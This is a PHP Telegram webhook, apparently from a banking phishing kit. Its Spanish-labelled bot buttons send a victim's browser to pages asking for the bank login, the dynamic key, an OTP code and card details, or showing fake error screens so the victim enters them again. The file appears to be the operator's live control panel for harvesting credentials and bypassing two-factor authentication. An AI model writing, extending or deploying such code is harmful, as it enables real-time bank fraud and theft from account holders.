<?php
// webhook.php

$config = require __DIR__ . '/../config.php';

// Obtener la actualización de Telegram
$update = json_decode(file_get_contents('php://input'), true);

// Verificar si es una callback query
if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $callback_data  = explode(':', $callback_query['data']);
    $action         = $callback_data[0] ?? '';
    $transaction_id = $callback_data[1] ?? '';

    // Iniciar sesión para almacenar el estado
    session_start();
    $_SESSION['current_transaction'] = $transaction_id;

    // Manejar diferentes acciones
    switch ($action) {
        case 'pedir_logo':
            $_SESSION['current_action'] = 'logo';
            $redirect_url = 'pedir_logo.php';
            break;
        case 'pedir_dinamica':
            $_SESSION['current_action'] = 'dinamica';
            $redirect_url = 'pedir_dinamica.php';
            break;
        case 'pedir_otp':
            $_SESSION['current_action'] = 'otp';
            $redirect_url = 'pedir_otp.php';
            break;
        case 'error_tc':
            $_SESSION['current_action'] = 'error_tc';
            $redirect_url = 'error_tc.php';
            break;
        case 'error_logo':
            $_SESSION['current_action'] = 'error_logo';
            $redirect_url = 'error_logo.php';
            break;
        case 'tarjeta':
            $_SESSION['current_action'] = 'tarjeta';
            $redirect_url = 'tarjeta.php';
            break;
        case 'finalizar':
        case 'confirm_finalizar':
            $_SESSION['current_action'] = 'finalizado';
            $redirect_url = 'finalizar.php';
            break;
        default:
            $redirect_url = '';
    }

    // Responder a la callback query
    $response_data = [
        'callback_query_id' => $callback_query['id'],
        'text'       => 'Procesando solicitud...',
        'show_alert' => false
    ];

    $ch = curl_init("https://api.telegram.org/bot" . $config['bot_token'] . "/answerCallbackQuery");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($response_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);

    if (!empty($redirect_url)) {
        $_SESSION['redirect_url'] = $redirect_url;
    }
}

// Responder con OK
http_response_code(200);
echo "OK";
